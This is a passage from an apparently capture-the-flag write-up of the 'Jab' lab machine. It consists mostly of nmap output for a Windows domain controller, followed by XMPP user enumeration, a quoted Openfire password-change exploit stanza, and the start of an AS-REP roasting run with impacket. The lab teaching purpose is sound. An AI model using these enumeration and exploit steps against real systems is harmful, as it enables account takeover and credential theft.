</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>jab-DC01-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
</span></span><span style="display:flex;"><span>| Not valid after:  2024-10-31T20:16:18
</span></span><span style="display:flex;"><span>| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
</span></span><span style="display:flex;"><span>|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>jab-DC01-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
</span></span><span style="display:flex;"><span>| Not valid after:  2024-10-31T20:16:18
</span></span><span style="display:flex;"><span>| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
</span></span><span style="display:flex;"><span>|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-05T18:15:54+00:00; +1m41s from scanner time.
</span></span><span style="display:flex;"><span>5222/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       invalid-namespace
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|       version: 1.0
</span></span><span style="display:flex;"><span>|     capabilities: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    stream_id: 1uxtkf3244
</span></span><span style="display:flex;"><span>5223/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    capabilities: 
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>5262/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       invalid-namespace
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|       version: 1.0
</span></span><span style="display:flex;"><span>|     capabilities: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    stream_id: 3yzkarmvqu
</span></span><span style="display:flex;"><span>5263/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    capabilities: 
</span></span><span style="display:flex;"><span>5269/tcp  open  xmpp          Wildfire XMPP Client
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    capabilities: 
</span></span><span style="display:flex;"><span>5270/tcp  open  ssl/xmpp      Wildfire XMPP Client
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>5275/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       invalid-namespace
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|       version: 1.0
</span></span><span style="display:flex;"><span>|     capabilities: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    stream_id: 7wn7oej6l
</span></span><span style="display:flex;"><span>5276/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| xmpp-info: 
</span></span><span style="display:flex;"><span>|   STARTTLS Failed
</span></span><span style="display:flex;"><span>|   info: 
</span></span><span style="display:flex;"><span>|     features: 
</span></span><span style="display:flex;"><span>|     errors: 
</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
</span></span><span style="display:flex;"><span>|     xmpp: 
</span></span><span style="display:flex;"><span>|     compression_methods: 
</span></span><span style="display:flex;"><span>|     unknown: 
</span></span><span style="display:flex;"><span>|_    capabilities: 
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>7070/tcp  open  http          Jetty
</span></span><span style="display:flex;"><span>|_http-title: Openfire HTTP Binding Service
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>7443/tcp  open  ssl/http      Jetty
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>dc01.jab.htb
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
</span></span><span style="display:flex;"><span>| Not valid after:  2028-10-24T22:00:12
</span></span><span style="display:flex;"><span>| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
</span></span><span style="display:flex;"><span>|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
</span></span><span style="display:flex;"><span>|_http-title: Openfire HTTP Binding Service
</span></span><span style="display:flex;"><span>7777/tcp  open  socks5        <span style="color:#f92672">(</span>No authentication; connection failed<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| socks-auth-info: 
</span></span><span style="display:flex;"><span>|_  No authentication
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49695/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49696/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49711/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49776/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49824/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span>OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.95%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>2/5%OT<span style="color:#f92672">=</span>53%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>41402%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>67A3AA78
</span></span><span style="display:flex;"><span>OS:%P<span style="color:#f92672">=</span>aarch64-unknown-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>100%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>109%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>OS:S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>OS:1%ISR<span style="color:#f92672">=</span>10D%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II
</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>107%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10D%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M5
</span></span><span style="display:flex;"><span>OS:3CNW8NNS%O2<span style="color:#f92672">=</span>M53CNW8NNS%O3<span style="color:#f92672">=</span>M53CNW8%O4<span style="color:#f92672">=</span>M53CNW8NNS%O5<span style="color:#f92672">=</span>M53CNW8NNS%O6<span style="color:#f92672">=</span>M53CNNS
</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FFFF%W2<span style="color:#f92672">=</span>FFFF%W3<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FF70<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W
</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M53CNW8NNS%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y
</span></span><span style="display:flex;"><span>OS:%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR
</span></span><span style="display:flex;"><span>OS:%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>OS:%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q
</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span><span style="color:#ae81ff">164</span>
</span></span><span style="display:flex;"><span>OS:%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">261</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IP ID Sequence Generation: Incremental
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1m40s, deviation: 0s, median: 1m40s
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2025-02-05T18:15:48
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span></code></pre></div><h3 id="xmpp---5269-5270-tcp">XMPP - 5269, 5270 (tcp)</h3>
<blockquote>
<p>If you don&rsquo;t already have an XMPP/Jabber client, I&rsquo;d recommend <code>Pidgin</code>.
<code>apt install pidgin</code></p></blockquote>
<p>Let&rsquo;s see if we&rsquo;re allowed to create an account.</p>
<p><img src="/images/jab1.png" alt="jab1">
<img src="/images/jab2.png" alt="jab2">
<img src="/images/jab3.png" alt="jab3"></p>
<p>Indeed we are, great news! Now let&rsquo;s see what else we can find on the XMPP server by doing a service discovery. You can enable the plugin for Pidgin in the Tools menu.</p>
<p><img src="/images/jab4.png" alt="jab4"></p>
<p>We&rsquo;re also able to search for users using the feature under the Accounts tab.</p>
<p><img src="/images/jab5.png" alt="jab5"></p>
<p>If we open the Debug window, we can see the raw XML for this query and copy the names, usernames, and emails for hopeful later use. I used CyberChef&rsquo;s &ldquo;Extract email addresses&rdquo; recipe to help parse the massive XML data from the log. I saved two files:</p>
<ul>
<li><code>emails.txt</code> - Contained email addresses</li>
<li><code>usernames.txt</code> - Stripped the &ldquo;@jab.htb&rdquo;</li>
</ul>
<p><img src="/images/jab6.png" alt="jab6"></p>
<h3 id="openfire---7070-7443-tcp">Openfire - 7070, 7443 (tcp)</h3>
<p>Maybe this will come in handy later?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>┌──(pl4stic㉿shattersec)-[~/htb/jab]
</span></span><span style="display:flex;"><span>└─$ cat /usr/share/exploitdb/exploits/multiple/remote/32967.txt 
</span></span><span style="display:flex;"><span>source: https://www.securityfocus.com/bid/34804/info
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Openfire is prone to a vulnerability that can permit an attacker to change the password of arbitrary users.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploiting this issue can allow the attacker to gain unauthorized access to the affected application and to completely compromise victims&#39; accounts.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Versions prior to Openfire 3.6.4 are vulnerable.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;iq</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#39;set&#39;</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#39;passwd_change&#39;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;query</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#39;jabber:iq:auth&#39;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;username&gt;</span>test2<span style="color:#f92672">&lt;/username&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;password&gt;</span>newillegalychangedpassword<span style="color:#f92672">&lt;/password&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/query&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/iq&gt;</span> 
</span></span></code></pre></div><h2 id="initial-access">Initial Access</h2>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>With our giant list of usernames, we should be able to see if any accounts have the <code>UF_DONT_REQUIRE_PREAUTH</code> value set, and perform a kerberoast attack.  Let&rsquo;s find out.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ impacket-GetNPUsers -no-pass -usersfile usernames.txt jab.htb/ 
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>&lt;---snip---&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User jmiller doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User jmontes doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
